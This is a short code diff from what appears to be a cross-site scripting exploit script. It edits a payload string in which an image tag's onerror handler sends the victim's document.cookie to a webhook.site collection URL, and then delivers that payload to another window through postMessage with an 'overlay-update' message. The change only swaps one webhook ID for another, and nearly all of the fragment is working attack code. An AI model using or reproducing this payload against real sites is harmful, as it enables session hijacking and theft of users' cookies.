@@ -7,7 +7,7 @@
     
     setTimeout(() => {
 
-      const xssPayload = '<img src="x"onerror="fetch(`https://webhook.site/1875238c-b451-44dd-baf0-0560d8c4f3e4?cookie=`+encodeURIComponent(document.cookie))">';
+      const xssPayload = '<img src="x"onerror="fetch(`https://webhook.site/237f6f29-8cfd-4ef2-82c8-f4d61204c215?cookie=`+encodeURIComponent(document.cookie))">';
       
       w.postMessage({
         type: 'overlay-update',
